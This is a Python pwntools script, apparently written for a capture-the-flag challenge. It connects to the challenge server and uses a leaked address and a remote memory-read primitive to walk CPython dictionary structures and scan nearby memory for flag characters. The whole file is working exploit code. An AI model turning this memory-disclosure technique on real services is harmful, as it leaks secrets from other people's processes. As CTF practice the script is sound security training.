from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
dict_obj_addr = int(m.group(1), 16)
print(f'PyDictObject address: {hex(dict_obj_addr)}')

def read_memory(addr):
    addr_str = f"{addr:x}"
    io.sendline(addr_str.encode())
    line = io.recvline(timeout=3).decode().strip()
    
    if 'illegal memory address' in line:
        return None
        
    parts = line.split(': ')
    if len(parts) >= 2:
        hex_data = parts[-1].strip()
        try:
            return bytes.fromhex(hex_data)
        except:
            return None
    return None

print("\n=== Careful PyDictObject Analysis ===")

reads_used = 0
max_reads = 40

# Read more of the dict object structure to understand layout
print("Reading PyDictObject structure (first 10 qwords):")
dict_fields = {}
for i in range(10):
    offset = i * 8
    data = read_memory(dict_obj_addr + offset)
    reads_used += 1
    
    if data:
        val = u64(data)
        dict_fields[offset] = val
        
        # Check if this looks like a valid pointer (heap address)
        if 0x400000 < val < 0x800000000000:
            print(f"  +{offset:#04x}: {val:#018x} <- POINTER")
        else:
            print(f"  +{offset:#04x}: {val:#018x} ({val})")

# Look for the most likely ma_keys pointer
ma_keys_candidates = []
for offset, val in dict_fields.items():
    if 0x400000 < val < 0x800000000000:
        ma_keys_candidates.append((offset, val))

print(f"\nFound {len(ma_keys_candidates)} potential pointers:")
for offset, ptr in ma_keys_candidates:
    print(f"  +{offset:#04x}: {ptr:#x}")

# Try each potential ma_keys pointer
for i, (offset, ma_keys_ptr) in enumerate(ma_keys_candidates[:3]):  # Try up to 3
    if reads_used >= max_reads - 10:
        break
        
    print(f"\n--- Testing pointer {i+1}: {ma_keys_ptr:#x} (from offset {offset:#x}) ---")
    
    # Read what looks like PyDictKeysObject header
    keys_header = {}
    for j in range(8):  # Read first 8 qwords of keys object
        keys_offset = j * 8
        data = read_memory(ma_keys_ptr + keys_offset)
        reads_used += 1
        
        if data:
            val = u64(data)
            keys_header[keys_offset] = val
            print(f"  keys+{keys_offset:#04x}: {val:#018x} ({val})")
            
            # Look for reasonable values that could be dict metadata
            if val > 0 and val < 1000:  # Reasonable for dict size/count
                print(f"    ^ Could be dict size/count: {val}")

print(f"\n=== Direct Entry Search ===")
# Since structure parsing is tricky, let's try a different approach
# Search memory around the dict area for individual string objects

search_base = dict_obj_addr
for search_offset in range(-0x1000, 0x2000, 8):
    if reads_used >= max_reads - 2:
        break
        
    search_addr = search_base + search_offset
    if search_addr <= 0x1000:
        continue
        
    data = read_memory(search_addr)
    reads_used += 1
    
    if not data:
        continue
        
    # Look for single character strings or small integers
    text_chars = []
    for b in data:
        if 32 <= b <= 126:
            text_chars.append(chr(b))
    
    text = ''.join(text_chars)
    
    # Focus on single characters or small numbers (likely flag components)
    if len(text) == 1 and (text.isalnum() or text in '{}_.,-'):
        print(f"  {search_addr:#x}: single char '{text}'")
    elif len(text) == 2 and text.isdigit():
        print(f"  {search_addr:#x}: number '{text}'")  
    elif any(c in text for c in 'KCSC{}'):
        print(f"  {search_addr:#x}: flag pattern '{text}'")

print(f"\nUsed {reads_used}/{max_reads} reads")
io.close()